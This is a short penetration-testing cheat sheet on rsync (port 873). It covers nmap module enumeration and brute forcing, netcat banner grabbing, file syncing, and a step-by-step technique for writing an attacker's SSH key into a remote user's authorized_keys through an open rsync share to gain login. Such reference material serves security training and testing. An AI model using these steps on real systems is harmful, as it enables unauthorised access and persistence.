---
title: Rsync Pentesting
description: Rsync is utility for efficiently transferring and synchronizing files between a computer and a storage drive and across networked computers by comparing the modification times and sizes of files. A default port is 873.
tags:
refs:
    - https://linuxize.com/post/how-to-use-rsync-for-local-and-remote-data-transfer-and-synchronization/
date: 2022-12-25
draft: false
---

## Enumeration

```sh
nmap --script rsync-list-modules -p 873 <target-ip>
nmap --script rsync-brute --script-args 'rsync-brute.module=www' <target-ip>

# Banner grabbing and list shared folders
nc -nv <target-ip> 873
#list

# List sync data
rsync <target-ip>::
rsync -av --list-only rsync://<target-ip>
```

When we found the shared folder, check if we can connect without authentication.  
Assume that we found the “shares” folder.

```sh
# Netcat
nc -nv <target-ip> 873
RSYNCD: 31.0
shares
RSYNCD: OK

# Rsync
rsync <target-ip>::shares
rsync -av --list-only rsync://<target-ip>:873/shares
```

### Check Config File

```sh
find / -name "rsyncd.conf" 2>/dev/null
cat /path/to/rsyncd.conf
```

<br />

## Sync Data

### From Local to Remote

```sh
rsync ./test <remote-ip>::shared_folder

rsync ./test rsync://<remote-user>@<remote-ip>:873/shared_folder
```

### From Remote to Local

```sh
rsync <remote-ip>::shared_folder ./test

rsync rsync://<remote-user>@<remote-ip>:873/shared_folder ./test
```

<br />

## SSH Key Syncing and SSH Login

### 1. Generate a SSH key in local machine
    
Copy the content of the public key to the authorized_keys.

```sh
ssh-keygen -f testkey
cat testkey.pub > authorized_keys
```

### 2. Sync the authorized_keys with the remote .ssh directory

```sh
rsync authorized_keys rsync://<remote-user>@<remote-ip>:873/<home_user>/.ssh
```

### 3. SSH login with the generated private key

```sh
ssh <remote-home-user>@<remote-ip> -i testkey
```
